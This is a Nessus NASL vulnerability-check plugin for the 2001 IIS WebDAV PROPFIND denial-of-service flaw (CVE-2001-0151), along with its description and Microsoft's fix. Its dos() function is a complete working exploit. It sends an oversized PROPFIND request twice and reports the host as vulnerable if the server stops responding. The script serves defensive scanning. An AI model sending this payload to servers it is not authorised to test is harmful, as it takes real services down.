#
# This security check is heavily based on Georgi Guninski's post
# on the bugtraq mailing list
#
# (ported to NASL by Renaud Deraison)
#


if(description)
{
 script_id(10631);
 script_bugtraq_id(2453);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2001-0151");
 name["english"] = "IIS propfind DoS";
 name["francais"] = "IIS propfind DoS";


 script_name(english:name["english"],
	     francais:name["francais"]);
 
 # Description
 desc["english"] = "
It was possible to disable the remote IIS server
by making a specially formed PROPFIND request.

Solution : disable the WebDAV extensions, as well as the PROPFIND command
http://www.microsoft.com/technet/security/bulletin/MS01-016.mspx
Risk factor : High";


 desc["francais"] = "
Il s'est avéré possible de désactiver le serveur IIS distant
en donnant des arguments spéciaux à la commande PROPFIND.

Solution : désactivez les options WebDAV et la command PROPFIND
	   cf http://www.microsoft.com/technet/security/bulletin/MS01-016.mspx
Facteur de risque : Elevé";

 script_description(english:desc["english"],
 		    francais:desc["francais"]);

 # Summary
 summary["english"] = "Performs a denial of service against IIS";
 summary["francais"] = "Provoque un déni de service contre un serveur IIS";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);

 # Category
 script_category(ACT_DENIAL);

 # Dependencie(s)
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 
 # Family
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"],
 	       francais:family["francais"]);
 
 # Copyright
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");

function dos(port)
{
 sock = open_sock_tcp(port);
 if(sock)
 {
 xml = 	string("<?xml version=") 		+	 
      	raw_string(0x22) 			+
	string("1.0") 				+
      	raw_string(0x22) 			+	 
	string("?><a:propfind xmlns:a=")	+
	raw_string(0x22)			+
	string("DAV:")				+
	raw_string(0x22)			+
	string(" xmlns:u=")			+
	raw_string(0x22)			+
	string("over:")				+
	raw_string(0x22)			+
	string("><a:prop><a:displayname /><u:") +
	crap(128008)				+
	string(" /></a:prop></a:propfind>\r\n");
	
 req = string("PROPFIND / HTTP/1.1\r\n",
	     "Content-Type: text/xml\r\n",
	     "Host: ", get_host_name(), "\r\n",
	     "Content-length: ", strlen(xml), "\r\n\r\n") + xml + string("\r\n\r\n");

     
 send(socket:sock, data:req);
 r = http_recv(socket:sock);
 close(sock);
 } 
}

port = get_http_port(default:80);


sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);

if(get_port_state(port))
{
 soc1 = open_sock_tcp(port);
 if(!soc1)exit(0);
 
 dos(port:port);
 sleep(1);
 dos(port:port);
 sleep(2);
 soc2 = open_sock_tcp(port);
 if(!soc2)security_hole(port);
}

